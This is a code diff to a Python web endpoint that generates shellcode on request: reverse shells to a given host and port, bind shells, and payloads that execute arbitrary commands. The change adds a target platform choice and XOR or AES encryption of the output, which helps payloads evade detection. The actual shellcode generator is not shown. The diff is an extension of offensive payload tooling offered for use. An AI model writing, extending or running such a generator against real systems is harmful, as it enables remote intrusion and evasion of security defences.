@@ -60,15 +60,18 @@ def generate_shellcode():
         print("Payload:", data)
 
         shellcode_type = data.get('type')
+        platform = data.get('platform', 'windows')
         encoding = data.get('encoding', 'base64')
-        print("Shellcode Type:", shellcode_type, "| Encoding:", encoding)
+        encryption = data.get('encryption', 'none')
+        key = data.get('key', '')
+        print(f"Shellcode Type: {shellcode_type} | Platform: {platform} | Encoding: {encoding} | Encryption: {encryption}")
 
         shellcode = None
 
         if shellcode_type == 'reverse':
             host = data.get('host')
             port = data.get('port')
-            print("Reverse shell requested → Host:", host, "| Port:", port)
+            print(f"Reverse shell requested → Host: {host} | Port: {port}")
 
             if not host or not port:
                 return jsonify({'error': 'Host and port are required for reverse shell'}), 400
@@ -78,11 +81,11 @@ def generate_shellcode():
             except ValueError:
                 return jsonify({'error': 'Port must be a number'}), 400
 
-            shellcode = shellcode_gen.generate_reverse_shell(host, port)
+            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)
 
         elif shellcode_type == 'bind':
             port = data.get('port')
-            print("Bind shell requested → Port:", port)
+            print(f"Bind shell requested → Port: {port}")
 
             if not port:
                 return jsonify({'error': 'Port is required for bind shell'}), 400
@@ -92,16 +95,16 @@ def generate_shellcode():
             except ValueError:
                 return jsonify({'error': 'Port must be a number'}), 400
 
-            shellcode = shellcode_gen.generate_bind_shell(port)
+            shellcode = shellcode_gen.generate_bind_shell(port, platform)
 
         elif shellcode_type == 'exec':
             command = data.get('command')
-            print("Exec shell requested → Command:", command)
+            print(f"Exec shell requested → Command: {command}")
 
             if not command:
                 return jsonify({'error': 'Command is required for exec'}), 400
 
-            shellcode = shellcode_gen.generate_exec(command)
+            shellcode = shellcode_gen.generate_exec(command, platform)
 
         else:
             print("[!] Invalid shellcode type")
@@ -110,6 +113,13 @@ def generate_shellcode():
         if shellcode is None:
             print("[!] Shellcode generation failed")
             return jsonify({'error': 'Shellcode generation failed'}), 500
+
+        # Apply encryption if requested
+        if encryption != 'none':
+            if encryption == 'xor':
+                shellcode = shellcode_gen.xor_encrypt(shellcode, key)
+            elif encryption == 'aes':
+                shellcode = shellcode_gen.aes_encrypt(shellcode, key)
 
         encoded_shellcode = shellcode_gen.encode_shellcode(shellcode, encoding)
 
